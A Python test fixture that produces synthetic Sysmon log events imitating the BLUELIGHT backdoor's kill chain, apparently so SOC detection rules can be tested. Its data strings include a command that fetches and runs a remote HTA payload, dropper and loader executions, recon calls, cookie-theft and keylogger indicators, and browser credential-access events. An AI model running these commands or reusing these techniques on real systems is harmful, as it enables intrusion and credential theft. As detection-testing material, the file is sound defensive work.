"""BLUELIGHT Sysmon kill-chain synthetic events."""

import ntpath

from testlogs.common import *  # noqa: F401,F403
from testlogs.windows_sysmon_core import sysmon_event


def _bluelight_kill_chain_sysmon_events():
    """Mirror of the kill-chain emitter into the SOC Windows Sysmon Logs source.

    The SOC Windows Sysmon parser has a longer-established field set, so emitting
    the same scenarios here gives the per-widget detections two routes to match —
    important when the Sysmon Operational parser's freshly-registered fields
    have not yet propagated.
    """
    events = []
    apt_host = "WS01.sevenkingdoms.local"
    apt_user = "joffrey"
    apt_image = "C:\\Users\\Public\\bluelight.exe"
    iexplore = "C:\\Program Files\\Internet Explorer\\iexplore.exe"
    powershell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    cmd = "C:\\Windows\\System32\\cmd.exe"
    base = 1000

    file_discovery_cmds = [
        ("dir /s /b C:\\Users\\joffrey\\Documents", iexplore, cmd),
        ("dir /s C:\\Users\\joffrey\\Desktop\\*.docx", iexplore, cmd),
        ("powershell -Command Get-ChildItem -Recurse -Path C:\\Users -Filter *.pdf",
         iexplore, powershell),
        ("tree C:\\Users\\joffrey /F", "C:\\Windows\\System32\\wscript.exe", cmd),
    ]
    for i, (cl, parent, image) in enumerate(file_discovery_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cl,
            parent_image=parent, host=apt_host, user=apt_user,
            msg="BLUELIGHT: file discovery from browser child",
            offset=base + i,
        ))

    sec_paths = [
        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend",
        "HKLM\\SOFTWARE\\Microsoft\\Security Center\\SecurityCenter2",
        "HKLM\\SOFTWARE\\Windows Defender\\Exclusions",
        "HKLM\\SOFTWARE\\AVAST Software\\Avast",
        "HKLM\\SOFTWARE\\ESET\\ESET Security",
        "HKLM\\SOFTWARE\\KasperskyLab\\AVP",
    ]
    for i, target in enumerate(sec_paths):
        events.append(sysmon_event(
            event_id=12 + (i % 3), image=apt_image, command_line="",
            parent_image=apt_image, host=apt_host, user=apt_user,
            target_object=target,
            msg="BLUELIGHT: registry enumeration of security products",
            offset=base + 50 + i,
        ))

    yara_pdb_cmds = [
        "C:\\Development\\BACKDOOR\\ncov\\Release\\bluelight.pdb",
        "powershell -Command Get-Content C:\\Users\\Public\\Release\\bluelight.pdb",
    ]
    for i, cl in enumerate(yara_pdb_cmds):
        events.append(sysmon_event(
            event_id=1, image=apt_image, command_line=cl,
            parent_image=cmd, host=apt_host, user=apt_user,
            msg="BLUELIGHT YARA: PDB path indicator",
            offset=base + 100 + i,
        ))
    events.append(sysmon_event(
        event_id=11, image=apt_image, command_line="",
        parent_image=apt_image, host=apt_host, user=apt_user,
        target_filename="C:\\Users\\Public\\BACKDOOR\\ncov\\bluelight.pdb",
        msg="BLUELIGHT YARA: PDB file write",
        offset=base + 110,
    ))

    yara_recon_cmds = [
        'curl https://ipinfo.io/json',
        'powershell -Command Invoke-WebRequest -Uri https://ipinfo.io',
        'cmd /c echo {"UserName":"joffrey","ComName":"WS01","OnlineIP":"203.0.113.10","LocalIP":"10.0.1.10","AntiVirus":"Windows Defender","Process Level":"Medium","VM":"false"}',
    ]
    for i, cl in enumerate(yara_recon_cmds):
        events.append(sysmon_event(
            event_id=1,
            image=apt_image if i == 2 else powershell,
            command_line=cl,
            parent_image=apt_image, host=apt_host, user=apt_user,
            msg="BLUELIGHT YARA: system reconnaissance JSON",
            offset=base + 130 + i,
        ))

    yara_cookie_cmds = [
        'powershell -Command "cookie_name: OSID, cookie_name: SID, __Secure-3PSID"',
        'cmd /c echo cookie_name: __Secure-3PSID',
        'powershell -Command "Failed to get chrome cookie"',
        'powershell -Command "Failed to get Edge cookie database"',
        'cmd /c echo GM_ACTION_TOKEN=abc GM_ID_KEY=xyz',
        'cmd /c echo mail/u/0/?ik=abc Success to enable imap',
        'cmd /c echo Success to enable thunder access',
    ]
    for i, cl in enumerate(yara_cookie_cmds):
        events.append(sysmon_event(
            event_id=1, image=apt_image, command_line=cl,
            parent_image=apt_image, host=apt_host, user=apt_user,
            msg="BLUELIGHT YARA: chrome/edge cookie theft",
            offset=base + 150 + i,
        ))

    keylog_files = [
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\cheV01.dat",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\INTEG.RAW",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\keylog.dat",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\keylog.log",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\edb.chk",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\edb.log",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\edbres00001.jrs",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\edbres00002.jrs",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\edbtmp.log",
    ]
    for i, path in enumerate(keylog_files):
        events.append(sysmon_event(
            event_id=11, image=apt_image, command_line="",
            parent_image=apt_image, host=apt_host, user=apt_user,
            target_filename=path,
            msg="BLUELIGHT YARA: keylogger staging",
            offset=base + 200 + i,
        ))

    yara_google_cmds = [
        'cmd /c echo Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5',
        'cmd /c echo User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:80.0) Gecko/20100101 Firefox/80.0',
        'cmd /c echo AccountSettingsUi/data/batchexecute SNlM0e BqLdsd token',
    ]
    for i, cl in enumerate(yara_google_cmds):
        events.append(sysmon_event(
            event_id=1, image=apt_image, command_line=cl,
            parent_image=apt_image, host=apt_host, user=apt_user,
            msg="BLUELIGHT YARA: Google App C2 indicator",
            offset=base + 230 + i,
        ))

    ingress_files = [
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\stage2.exe",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\loader.dll",
        "C:\\Users\\Public\\AppData\\Roaming\\update.scr",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\runner.bat",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\stager.ps1",
    ]
    for i, path in enumerate(ingress_files):
        events.append(sysmon_event(
            event_id=11, image=apt_image, command_line="",
            parent_image=apt_image, host=apt_host, user=apt_user,
            target_filename=path,
            msg="BLUELIGHT: ingress tool transfer",
            offset=base + 260 + i,
        ))

    wmi_cmds = [
        "powershell -Command Get-WmiObject -Class Win32_ComputerSystem",
        "powershell -Command Get-CimInstance -ClassName Win32_OperatingSystem",
        "wmic.exe path Win32_Processor get Name",
        "wmic.exe path Win32_NetworkAdapterConfiguration get IPAddress",
    ]
    for i, cl in enumerate(wmi_cmds):
        events.append(sysmon_event(
            event_id=1,
            image=powershell if "powershell" in cl else "C:\\Windows\\System32\\wbem\\wmic.exe",
            command_line=cl,
            parent_image=iexplore, host=apt_host, user=apt_user,
            msg="BLUELIGHT: WMI system enumeration from browser child",
            offset=base + 300 + i,
        ))

    child_proc_set = [
        ("cmd.exe /c whoami", cmd),
        ("powershell.exe -NoProfile -Command Get-Process", powershell),
        ("wscript.exe C:\\Users\\Public\\loader.vbs", "C:\\Windows\\System32\\wscript.exe"),
        ("mshta.exe http://203.0.113.20/payload.hta", "C:\\Windows\\System32\\mshta.exe"),
        ("cscript.exe //e:vbs C:\\Users\\Public\\dropper.vbs", "C:\\Windows\\System32\\cscript.exe"),
        ("rundll32.exe C:\\Users\\Public\\stage.dll,RunMain", "C:\\Windows\\System32\\rundll32.exe"),
    ]
    for i, (cl, image) in enumerate(child_proc_set):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cl,
            parent_image=iexplore, host=apt_host, user=apt_user,
            msg="BLUELIGHT: browser spawning suspicious child process",
            offset=base + 330 + i,
        ))

    for i, browser in enumerate([
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "C:\\Program Files\\Internet Explorer\\iexplore.exe",
    ]):
        events.append(sysmon_event(
            event_id=10, image=apt_image, command_line="",
            parent_image=apt_image, host=apt_host, user=apt_user,
            target_image=browser, granted_access="0x1fffff",
            msg=f"BLUELIGHT browser credential access: {ntpath.basename(browser)}",
            offset=base + 360 + i,
        ))

    return events

